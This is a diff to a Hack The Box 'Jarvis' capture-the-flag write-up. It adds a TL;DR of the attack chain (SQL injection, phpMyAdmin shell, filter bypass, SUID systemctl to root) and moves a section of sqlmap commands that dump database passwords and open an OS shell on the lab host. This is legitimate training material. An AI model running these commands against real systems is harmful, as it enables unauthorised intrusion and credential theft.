@@ -35,10 +35,12 @@ This machine was done as OSCP preparation so without SQLMap.
     - [/var/www/Admin-Utilities/simpler.py](#varwwwadmin-utilitiessimplerpy)
     - [/bin/systemctl](#binsystemctl)
       - [GTFO bins](#gtfo-bins)
-  - [SQLMap](#sqlmap)
-    - [Confirming the vulnerable parameter](#confirming-the-vulnerable-parameter)
-    - [DBadmin password](#dbadmin-password)
-    - [Shell](#shell)
+  - [TL;DR](#tldr)
+  - [Bonus](#bonus)
+    - [SQLMap](#sqlmap)
+      - [Confirming the vulnerable parameter](#confirming-the-vulnerable-parameter)
+      - [DBadmin password](#dbadmin-password)
+      - [Shell](#shell)
 
 ## Open ports
 
@@ -317,11 +319,21 @@ cat root.txt
 d41d8cd9************************
 ```
 
-## SQLMap
+## TL;DR
+
+- The page room.php is vulnerable to SQL injection
+- Crack password extracted via SQL injection to get into PHPMyAdmin
+- Start a shell from PHPMyAdmin
+- Bad character filter in Python application allows www-data to execute commands as pepper
+- SUID /bin/cystemctl from pepper to root
+
+## Bonus
+
+### SQLMap
 
 SQLMap wasn't used during the initial exploitation of this box to keep it limited to what's allowed to use during the OSCP exam.
 
-### Confirming the vulnerable parameter
+#### Confirming the vulnerable parameter
 
 ```bash
 luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
@@ -341,7 +353,7 @@ Parameter: cod (GET)
 ...
 ```
 
-### DBadmin password
+#### DBadmin password
 
 ```bash
 luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --passwords
@@ -352,7 +364,7 @@ luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/ro
 ...
 ```
 
-### Shell
+#### Shell
 
 ```bash
 luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell
